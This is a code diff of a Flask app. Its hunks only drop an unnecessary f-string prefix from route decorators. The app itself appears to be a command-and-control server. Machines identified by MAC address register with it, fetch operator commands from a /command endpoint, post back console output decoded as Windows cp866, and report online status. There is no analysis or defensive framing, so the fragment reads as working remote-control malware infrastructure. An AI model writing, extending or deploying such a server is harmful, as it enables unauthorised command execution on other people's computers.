@@ -19,7 +19,7 @@ def list_users(mac):
     return f'salam! {mac}'
 
 
-@app.route(f'/users/<mac>/command', methods=['GET', 'POST'])
+@app.route('/users/<mac>/command', methods=['GET', 'POST'])
 def command(mac):
     if request.method == 'POST':
         users[mac]['cmd'] = request.form['cmd']
@@ -30,7 +30,7 @@ def command(mac):
     return users[mac]['cmd']
 
 
-@app.route(f'/users/<mac>/output', methods=['GET', 'POST'])
+@app.route('/users/<mac>/output', methods=['GET', 'POST'])
 def output(mac):
     if request.method == 'POST':
         req = request.form['out'].encode('cp1251').decode('cp866')
@@ -40,7 +40,7 @@ def output(mac):
     return users[mac]['out']
 
 
-@app.route(f'/users/<mac>/clear', methods=['GET'])
+@app.route('/users/<mac>/clear', methods=['GET'])
 def clear(mac):
     users[mac]['cmd'] = ''
     return "Command cleared"
@@ -54,7 +54,7 @@ def new_user():
     return "new guy joined!!!"
 
 
-@app.route(f'/users/<mac>/online', methods=['GET', 'POST'])
+@app.route('/users/<mac>/online', methods=['GET', 'POST'])
 def online(mac):
     users[mac]['last'] = 0
     users[mac]['online'] = 'online'
